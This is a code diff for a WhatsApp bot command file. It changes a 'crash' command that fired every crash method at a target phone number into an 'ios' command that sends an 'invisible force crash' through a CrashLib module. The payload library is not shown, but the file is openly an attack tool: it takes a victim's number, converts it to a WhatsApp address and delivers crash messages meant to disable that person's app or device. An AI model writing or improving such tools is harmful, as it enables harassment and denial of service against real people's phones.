@@ -1,25 +1,27 @@
-// commands/crash/crash.js
 'use strict';
+const { CrashLib } = require('../../lib/crashlib');
 
 module.exports = {
-    name: 'crash',
-    aliases: ['crashall', 'executeall', 'alldamage'],
+    name: 'ios',
+    aliases: ['ioscrash', 'iosforce'],
     category: 'crash',
-    desc: 'ᴇxᴇᴄᴜᴛᴇ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs',
-    usage: '.crash <number>',
+    desc: 'ɪᴏs ɪɴᴠɪsɪʙʟᴇ ғᴏʀᴄᴇ ᴄʀᴀsʜ',
+    usage: '.ios <number>',
     waitReact: true,
 
     async execute(sock, msg, args, ctx) {
         const target = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || msg.chat;
-        const crashLib = global.getCrashLib();
         
-        if (!crashLib) return sock.sendMessage(ctx.from, { text: '❌ ᴄʀᴀsʜʟɪʙ ɴᴏᴛ ʀᴇᴀᴅʏ' }, { quoted: msg });
+        let crashLib = global.getCrashLib?.();
+        if (!crashLib) {
+            crashLib = new CrashLib(sock);
+        }
         
-        await sock.sendMessage(ctx.from, { text: '💣 ᴇxᴇᴄᴜᴛɪɴɢ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs...' }, { quoted: msg });
+        await sock.sendMessage(ctx.from, { text: '💥 sᴇɴᴅɪɴɢ ɪᴏs ᴄʀᴀsʜ...' }, { quoted: msg });
         
         try {
-            await crashLib.executeAll(target, msg);
-            return sock.sendMessage(ctx.from, { text: '✅ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
+            await crashLib.iosInvisibleForce(target);
+            return sock.sendMessage(ctx.from, { text: '✅ ɪᴏs ᴄʀᴀsʜ sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
         } catch (e) {
             return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
         }
